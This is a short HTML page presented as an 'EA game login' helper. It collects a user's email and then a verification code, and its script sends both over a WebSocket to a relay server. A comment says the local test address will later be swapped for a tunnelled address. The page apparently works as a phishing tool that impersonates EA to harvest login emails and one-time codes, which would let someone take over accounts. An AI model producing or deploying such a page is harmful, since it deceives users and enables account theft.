<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>EA游戏登录助手</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
    body{background:#121212;color:#fff;display:grid;place-items:center;height:100vh;padding:20px}
    .box{background:#1e1e1e;padding:30px;border-radius:14px;width:100%;max-width:420px}
    h1{font-size:20px;margin-bottom:20px;text-align:center}
    input{width:100%;padding:14px;margin:10px 0;background:#2a2a2a;border:none;border-radius:8px;color:#fff;font-size:16px}
    button{width:100%;padding:14px;background:#007bff;border:none;border-radius:8px;color:#fff;font-size:16px;margin-top:10px;cursor:pointer}
    #codeBox{display:none}
  </style>
</head>
<body>
  <div class="box">
    <h1>EA游戏登录</h1>
    <div id="mailBox">
      <input type="email" id="email" placeholder="输入邮箱" autocomplete="off">
      <button onclick="sendEmail()">提交邮箱</button>
    </div>
    <div id="codeBox">
      <input type="text" id="code" placeholder="输入验证码" autocomplete="off">
      <button onclick="sendCode()">提交验证码</button>
    </div>
  </div>

  <script>
    // 这里后面会换成你的穿透地址，现在先空着，用本地地址测试
    const ws = new WebSocket("ws://localhost:19198");

    function sendEmail() {
      const email = document.getElementById("email").value;
      ws.send(JSON.stringify({type:"email", data:email}));
      document.getElementById("mailBox").style.display = "none";
      document.getElementById("codeBox").style.display = "block";
    }

    function sendCode() {
      const code = document.getElementById("code").value;
      ws.send(JSON.stringify({type:"code", data:code}));
    }
  </script>
</body>
